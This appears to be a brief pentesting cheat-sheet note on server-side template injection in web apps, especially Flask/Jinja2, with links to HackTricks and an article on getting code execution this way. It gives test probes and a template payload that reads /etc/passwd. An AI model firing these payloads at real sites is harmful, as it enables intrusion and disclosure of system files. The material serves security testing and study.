https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

##### Where to find
Any website place with reflected user input
E͟s͟p͟e͟c͟i͟a͟l͟l͟y͟ F͟l͟a͟s͟k͟ a͟p͟p͟s͟ (werkzeug)

##### How to test
Where the input gets reflected, use `{{7 * 7}}`
To test for jinja2, use `{{7*-}}`

#### Arbitrary file read:
```
{{get_user_file("/etc/passwd")}}
```

For Flask apps, see "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti"
https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
